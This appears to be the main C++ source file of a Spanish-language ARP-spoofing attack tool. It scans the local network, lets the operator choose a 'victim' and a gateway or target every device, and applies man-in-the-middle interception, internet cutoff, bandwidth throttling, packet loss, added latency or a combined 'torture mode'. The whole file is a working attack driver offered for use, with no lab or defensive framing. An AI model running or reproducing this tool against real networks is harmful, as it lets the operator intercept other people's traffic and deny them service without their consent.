#include "network_utils.h"
#include "network_scanner.h"
#include "arp_spoofer.h"
#include "traffic_control.h"
#include "gateway_utils.h"
#include <iostream>
#include <vector>
#include <csignal>

// ✅ DEFINICIONES REALES AQUÍ
ARPSpoofer* globalSpoofer = nullptr;
std::string global_iface;

extern void signal_handler(int signo);

int main() {
    std::string interface = get_active_interface();
    std::string ip = get_ip_address(interface);
    std::string mac = get_mac_address(interface);

    global_iface = interface;

    if (interface.empty() || ip.empty() || mac.empty()) {
        std::cerr << "Error detectando interfaz/IP/MAC." << std::endl;
        return 1;
    }

    std::cout << "\n[*] Interfaz detectada: " << interface << "\n";
    std::cout << "[*] Dirección IP: " << ip << "\n";
    std::cout << "[*] Dirección MAC: " << mac << "\n\n";

    enable_gateway_mode(); // ⚡ Habilitar forwarding y NAT

    signal(SIGINT, signal_handler); // Ctrl+C global

    NetworkScanner scanner(interface, ip);
    std::vector<Device> devices = scanner.scan();

    if (devices.empty()) {
        std::cerr << "[!] No se detectaron dispositivos en la red.\n";
        return 1;
    }

    std::cout << "\n[*] Modo de ataque:\n";
    std::cout << "1. Spoofing dirigido (elegir víctima y gateway)\n";
    std::cout << "2. Spoofing a todos los dispositivos\n";
    std::cout << "Opción: ";

    int opcion;
    std::cin >> opcion;

    ARPSpoofer spoofer(interface, ip, mac);
    globalSpoofer = &spoofer;

    if (opcion == 1) {
        int v_idx = 0, g_idx = 0;

        std::cout << "\n[*] Dispositivos detectados:\n";
        for (size_t i = 0; i < devices.size(); ++i) {
            std::cout << "[" << i << "] IP: " << devices[i].ip << " | MAC: " << devices[i].mac << std::endl;
        }

        std::cout << "\nElige el número de la víctima: ";
        std::cin >> v_idx;
        std::cout << "Elige el número del gateway: ";
        std::cin >> g_idx;

        if (v_idx >= 0 && v_idx < devices.size() && g_idx >= 0 && g_idx < devices.size()) {

            std::cout << "\n[*] ¿Qué acción deseas aplicar a la víctima?\n";
            std::cout << "1. Solo interceptar tráfico (MITM)\n";
            std::cout << "2. Cortar Internet (no IP forwarding)\n";
            std::cout << "3. Limitar velocidad a 100kbps\n";
            std::cout << "4. Inyectar pérdida de paquetes (50%)\n";
            std::cout << "5. Aumentar latencia (1000ms)\n";
            std::cout << "6. Modo tortura (todo junto)\n";
            std::cout << "7. Restaurar conexión\n";
            std::cout << "Opción: ";

            int action;
            std::cin >> action;

            if (action == 1) {
                system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null");
            } else if (action == 2) {
                system("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null");
            } else if (action == 3) {
                apply_tc_limit(interface, devices[v_idx].ip);
            } else if (action == 4) {
                apply_tc_loss(interface, devices[v_idx].ip);
            } else if (action == 5) {
                apply_tc_delay(interface, devices[v_idx].ip);
            } else if (action == 6) {
                apply_tc_combo(interface, devices[v_idx].ip);
            } else if (action == 7) {
                remove_tc(interface);
            }

            spoofer.spoof_single(devices[v_idx], devices[g_idx]);
        } else {
            std::cerr << "Índices inválidos.\n";
        }

    } else if (opcion == 2) {
        Device gateway;
        for (const auto& dev : devices) {
            if (dev.ip.back() == '1') {
                gateway = dev;
                break;
            }
        }

        if (gateway.ip.empty()) {
            std::cerr << "[!] No se encontró un gateway válido.\n";
            return 1;
        }

        spoofer.spoof_all(devices, gateway);
    }

    return 0;
}